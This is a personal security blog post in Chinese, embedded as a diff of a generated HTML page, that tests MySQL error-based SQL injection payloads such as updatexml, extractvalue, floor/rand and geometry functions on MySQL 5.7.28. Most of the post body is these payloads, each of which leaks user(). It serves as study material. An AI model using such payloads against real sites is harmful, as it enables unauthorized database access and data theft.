@@ -1,0 +1,404 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>sql注入-报错注入 | Now you see me! | 夫君子之行，静以修身，俭以养德。非淡泊无以明志，非宁静无以致远。</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="sql注入">
+    <meta name="description" content="当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦">
+<meta property="og:type" content="article">
+<meta property="og:title" content="sql注入-报错注入">
+<meta property="og:url" content="http://leemeanvvi.github.io/2019/12/10/sql%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Now you see me!">
+<meta property="og:description" content="当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/12/QcP4UI.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/12/QcEakj.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/12/QcEN7Q.png">
+<meta property="og:image" content="https://s2.ax1x.com/2019/12/12/QcEdts.png">
+<meta property="article:published_time" content="2019-12-10T09:07:03.000Z">
+<meta property="article:modified_time" content="2020-06-10T15:36:40.062Z">
+<meta property="article:author" content="Kerberos">
+<meta property="article:tag" content="sql注入">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.ax1x.com/2019/12/12/QcP4UI.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Now you see me!" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/whoami.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Kerberos</h5>
+          <a href="mailto:fkBCDlIUiZFe@protonmail.com" title="fkBCDlIUiZFe@protonmail.com" class="mail">fkBCDlIUiZFe@protonmail.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                Home
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                Archives
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                Tags
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                Categories
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/leemeanvvi" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-rocket"></i>
+                About
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">sql注入-报错注入</div>
+        
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">sql注入-报错注入</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-12-10T09:07:03.000Z" itemprop="datePublished" class="page-time">
+  2019-12-10
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li></ul>
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#mysql"><span class="post-toc-number">1.</span> <span class="post-toc-text">mysql</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#小结"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">小结</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-sql注入-报错注入"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">sql注入-报错注入</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-12-10 17:07:03" datetime="2019-12-10T09:07:03.000Z"  itemprop="datePublished">2019-12-10</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/web%E5%AE%89%E5%85%A8/">web安全</a></li></ul>
+
+
+
+            
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>当站点中存在注入并且可以返回错误信息时，可以利用报错函数进行注入，省去确认字段数量的麻烦</p>
+<a id="more"></a>
+<h3 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h3><p>网上常见有十二种报错方法，然而实战中我最常用的只有updatexml()，函数名好记并且构造比较简单，对于其他报错函数非常陌生，遂逐一测试，以下为常见的报错方法在mysql 5.7.28版本下的测试结果</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/12/12/QcP4UI.png" alt="version" title="">
+                </div>
+                <div class="image-caption">version</div>
+            </figure>
+
+<p>upadtexml()</p>
+<p><code>select updatexml(1,concat(0x7e,user()),1);</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/12/12/QcEakj.png" alt="updatexml()" title="">
+                </div>
+                <div class="image-caption">updatexml()</div>
+            </figure>
+
+<p>extractvalue()</p>
+<p><code>select extractvalue(1,concat(0x7e,user()));</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/12/12/QcEN7Q.png" alt="extractvalue()" title="">
+                </div>
+                <div class="image-caption">extractvalue()</div>
+            </figure>
+
+
+<p>floor()</p>
+<p><code>select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://s2.ax1x.com/2019/12/12/QcEdts.png" alt="floor()" title="">
+                </div>
+                <div class="image-caption">floor()</div>
+            </figure>
+
+<p>name_const()</p>
+<p><code>select name_const(user(),0);</code></p>
+<p>高版本不可用</p>
+<p>join</p>
+<p><code>select * from(select * from mysql.user a join mysql.user b)c;</code></p>
+<p>能用但貌似只能爆列名，用处不大</p>
+<p>exp()</p>
+<p><code>select exp(~(select * from(select user())a));</code></p>
+<p>高版本不可用</p>
+<p>GeometryCollection()</p>
+<p><code>geometrycollection((select * from(select * from(select user())a)b));</code></p>
+<p>高版本不可用</p>
+<p>polygon()</p>
+<p><code>select polygon((select * from(select * from(select user())a)b));</code></p>
+<p>高版本不可用</p>
+<p>multipoint()</p>
+<p><code>select multipoint((select * from(select * from(select user())a)b));</code></p>
+<p>高版本不可用</p>
+<p>multlinestring()</p>
+<p><code>select multilinestring((select * from(select * from(select user())a)b));</code></p>
+<p>高版本不可用</p>
+<p>multipolygon()</p>
+<p><code>select multipolygon((select * from(select * from(select user())a)b));</code></p>
+<p>高版本不可用</p>
+<p>linestring()</p>
+<p><code>select linestring((select * from(select * from(select user())a)b));</code></p>
+<p>高版本不可用</p>
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>updatexml()和extractvalue()函数是比较实用的，floor()函数的构造实在太难记了，后面几种报错方法看payload应该原理差不多，只是用不同函数来触发而已，而且高版本的mysql都用不了。</p>
+
+        </div>
+
+        <blockquote class="post-copyright">
+    
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2020-06-10T15:36:40.062Z" itemprop="dateUpdated">2020-06-10 23:36:40</time>
+</span><br>
+
+
+        
+        Why so serious?
+        
+    </div>
+    
+    <footer>
+        <a href="http://leemeanvvi.github.io">
+            <img src="/img/whoami.jpg" alt="Kerberos">
+            Kerberos
+        </a>
+    </footer>
+</blockquote>
+
+        
+
+
+        <div class="post-footer">
+            
+	<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql%E6%B3%A8%E5%85%A5/" rel="tag">sql注入</a></li></ul>
+
+
+            
+
+
+        </div>
+    </div>
+
+    
+<nav class="post-nav flex-row flex-justify-between">
+  
+    <div class="waves-block waves-effect prev">
+      <a href="/2019/12/12/gcc%E4%B8%8Epwn%E7%BB%83%E4%B9%A0/" id="post-prev" class="post-nav-link">
+        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
+        <h4 class="title">gcc与pwn练习</h4>
+      </a>
+    </div>
+  
+
+  
+    <div class="waves-block waves-effect next">
+      <a href="/2019/12/10/sql%E6%B3%A8%E5%85%A5base/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">sql注入base</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+
+    
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</article>
+
+
+
+</div>
+
+        <footer class="footer">
+    <div class="top">
+        
+
+        <p>
+            
+                <span><a href="/atom.xml" target="_blankccc" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
+            
+            <span>This blog is licensed under a <a rel="license" href="https://creativecommons.org/licenses/by/4.0/">Creative Commons Attribution 4.0 International License</a>.</span>
+        </p>
+    </div>
+    <div class="bottom">
+        <p><span>Kerberos &copy; 2019 - 2020</span>
+            <span>
+                
+                Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/yscoder/hexo-theme-indigo" target="_blank">indigo</a>
+            </span>
+        </p>
+    </div>
+</footer>
+
+    </main>
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: false, REWARD: false };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+
+
+
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
